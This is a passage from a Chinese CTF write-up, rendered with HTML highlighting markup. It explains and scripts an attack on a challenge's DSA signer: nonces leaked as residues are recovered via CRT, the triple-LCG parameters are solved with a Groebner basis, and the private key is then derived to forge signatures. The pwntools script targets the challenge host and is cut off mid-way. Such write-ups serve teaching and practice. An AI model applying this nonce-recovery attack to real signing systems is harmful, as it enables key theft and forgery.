                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Good! Your flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Invalid signature.\n"</span><span class="token punctuation">)</span></code></pre>

<p>分析代码,给出了一个自定的三重lcg,part1给出12组签名的r,以及一个k与很多素数的模的list</p>
<p>9个素数,每个16位，乘积大于k的128位,所以crt可以恢复出k的值</p>
<p>现在相当于拥有12组k,根据12组k逆向lcg即可</p>
<p>使用Grobner基解同余方程组,即可恢复所有参数,接下来预测k值,p,q,g,y均为已知值,即可计算得到x</p>
<p>然后伪造签名即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256

sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node1.tgctf.woooo.tech"</span><span class="token punctuation">,</span><span class="token number">31104</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

small_primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">59093</span><span class="token punctuation">,</span> <span class="token number">65371</span><span class="token punctuation">,</span> <span class="token number">37337</span><span class="token punctuation">,</span> <span class="token number">43759</span><span class="token punctuation">,</span> <span class="token number">52859</span><span class="token punctuation">,</span> <span class="token number">39541</span><span class="token punctuation">,</span> <span class="token number">60457</span><span class="token punctuation">,</span> <span class="token number">61469</span><span class="token punctuation">,</span> <span class="token number">43711</span><span class="token punctuation">]</span>

<span class="token keyword">class</span> <span class="token class-name">TripleLCG</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">[</span>seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3<span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>a <span class="token operator">=</span> a
        self<span class="token punctuation">.</span>b <span class="token operator">=</span> b
        self<span class="token punctuation">.</span>c <span class="token operator">=</span> c
        self<span class="token punctuation">.</span>d <span class="token operator">=</span> d
        self<span class="token punctuation">.</span>n <span class="token operator">=</span> n

    <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        new <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>c <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>d<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n
        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new<span class="token punctuation">)</span>
        <span class="token keyword">return</span> new

<span class="token keyword">class</span> <span class="token class-name">DSA</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># while True:</span>
            <span class="token comment"># self.q = getPrime(160)</span>
            <span class="token comment"># t = 2 * getPrime(1024 - 160) * self.q</span>
            <span class="token comment"># if isPrime(t + 1):</span>
            <span class="token comment">#    self.p = t + 1</span>
            <span class="token comment">#    break</span>
        self<span class="token punctuation">.</span>p <span class="token operator">=</span> dsa_p
        self<span class="token punctuation">.</span>q <span class="token operator">=</span> dsa_q
        self<span class="token punctuation">.</span>g <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> self<span class="token punctuation">.</span>q<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>x <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> self<span class="token punctuation">.</span>x<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">sign</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>
        h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> k<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        s <span class="token operator">=</span> <span class="token punctuation">(</span>inverse<span class="token punctuation">(</span>k<span class="token punctuation">,</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>h <span class="token operator">+</span> self<span class="token punctuation">.</span>x <span class="token operator">*</span> r<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        <span class="token keyword">return</span> <span class="token punctuation">(</span>r<span class="token punctuation">,</span> s<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> r <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>q <span class="token keyword">and</span> <span class="token number">0</span> <span class="token operator">&lt;</span> s <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        w <span class="token operator">=</span> inverse<span class="token punctuation">(</span>s<span class="token punctuation">,</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span>
        u1 <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">*</span> w<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        u2 <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">*</span> w<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        v <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> u1<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>y<span class="token punctuation">,</span> u2<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        <span class="token keyword">return</span> v <span class="token operator">==</span> r
<span class="token comment"># -------------------------------------------------</span>
<span class="token comment"># get pqgy</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'!\n'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'p = '</span><span class="token punctuation">)</span>
p<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b','</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'p = '</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'q = '</span><span class="token punctuation">)</span>
q<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b','</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q = '</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'g = '</span><span class="token punctuation">)</span>
g<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b','</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'g = '</span><span class="token punctuation">,</span>g<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'y = '</span><span class="token punctuation">)</span>
y<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'y = '</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----------------------------------------------------'</span><span class="token punctuation">)</span>
<span class="token comment"># part 1</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'] '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
r_l<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
ks_l<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'] '</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'r = '</span><span class="token punctuation">)</span>
    r<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b','</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'r = '</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'ks = '</span><span class="token punctuation">)</span>
    ks<span class="token operator">=</span><span class="token builtin">eval</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ks = '</span><span class="token punctuation">,</span>ks<span class="token punctuation">)</span>
    r_l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
    ks_l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ks<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>r_l<span class="token punctuation">,</span>ks_l<span class="token punctuation">)</span>

<span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">def</span> <span class="token function">recover_k</span><span class="token punctuation">(</span>residues<span class="token punctuation">)</span><span class="token punctuation">:</span>    
    <span class="token keyword">return</span> solve_crt<span class="token punctuation">(</span>residues<span class="token punctuation">,</span>small_primes<span class="token punctuation">)</span>

k_ <span class="token operator">=</span> <span class="token punctuation">[</span>recover_k<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> ks_l<span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>k_<span class="token punctuation">)</span>

<span class="token comment">#k_= [172878032310918761957320639543653575954, 65601781483750822156822913226632595144, 10096210446214282339114263785545264202, 95107391569799156514079455200709366408, 117644907547146123900198723640727373206, 37631792366646059834025110885248419285, 105367623507085661118822334572436160357, 108765893575822931804483321330995468016, 151400201142369776561490646780034750340, 124744556917675016810611051516964200333, 32083522257873898706547528258092321135, 28282985849414089611886533440861756190]</span>

R<span class="token punctuation">.</span><span class="token operator">&lt;</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>

f1<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
f2<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>
f3<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>
f4<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>
f5<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span>
f6<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>
f7<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span>
f8<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span>
f9<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span>

F<span class="token operator">=</span><span class="token punctuation">[</span>f1<span class="token punctuation">,</span>f2<span class="token punctuation">,</span>f3<span class="token punctuation">,</span>f4<span class="token punctuation">,</span>f5<span class="token punctuation">,</span>f6<span class="token punctuation">,</span>f7<span class="token punctuation">,</span>f8<span class="token punctuation">,</span>f9<span class="token punctuation">]</span>
ideal <span class="token operator">=</span> Ideal<span class="token punctuation">(</span>F<span class="token punctuation">)</span>

I <span class="token operator">=</span> ideal<span class="token punctuation">.</span>groebner_basis<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span>
n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>I<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span>I<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n
b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span>I<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n
c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span>I<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n
d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span>I<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n

<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>b<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>c<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>d<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

lcg<span class="token operator">=</span>TripleLCG<span class="token punctuation">(</span>k_<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k_<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k_<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--------------------------------------------------'</span><span class="token punctuation">)</span>
<span class="token comment">#part 2</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'] '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' 2\n'</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">307</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    k <span class="token operator">=</span> lcg<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

r_l2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
s_l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'] '</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">)</span>

    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'r = '</span><span class="token punctuation">)</span>
    r<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b','</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'r = '</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b's = '</span><span class="token punctuation">)</span>
    s<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'s = '</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span>

    r_l2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
    s_l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r_l2<span class="token punctuation">,</span>s_l<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>r_l2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s_l<span class="token punctuation">)</span><span class="token punctuation">)</span>

m <span class="token operator">=</span> <span class="token string">b'a'</span>
h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
k <span class="token operator">=</span> lcg<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'k='</span><span class="token punctuation">,</span>k<span class="token punctuation">)</span>
inv_r<span class="token operator">=</span>inverse<span class="token punctuation">(</span>r_l2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span>
x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s_l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>k<span class="token operator">%</span>q<span class="token operator">-</span>h<span class="token punctuation">)</span><span class="token operator">*</span>inv_r<span class="token punctuation">)</span> <span class="token operator">%</span> q
<span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------"</span><span class="token punctuation">)</span>
<span class="token comment">#part 3</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'] '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span>

end_m<span class="token operator">=</span><span class="token string">b'b'</span>
